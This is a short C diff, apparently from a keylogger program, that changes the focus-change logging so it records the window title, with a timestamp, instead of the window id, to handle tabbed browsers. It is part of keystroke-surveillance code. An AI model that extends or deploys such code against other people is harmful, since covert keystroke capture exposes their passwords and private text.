@@ -28,14 +28,16 @@ struct keystroke_info
 #ifndef DEBUG
 static void process_event( const struct keystroke_info *info )
 {
-    static Window current = 0;
+    static char *current = NULL;
     char time_buf[ 22 ];
     const char *out;
 
-    /* notify change of focus with timestamp */
-    if ( current != info->focused_window )
+    /* notify change of focus with timestamp (use title instead of window id to
+       deal with "tabbed" apps like Chrome) */
+    if ( !current || strcmp( current , info->focused_window_name ) != 0 )
     {
-        current = info->focused_window;
+        free( current );
+        current = strdup( info->focused_window_name );
 
         /* format timestamp */
         strftime( time_buf , 22 , "%d/%m/%Y @ %H:%M:%S" ,
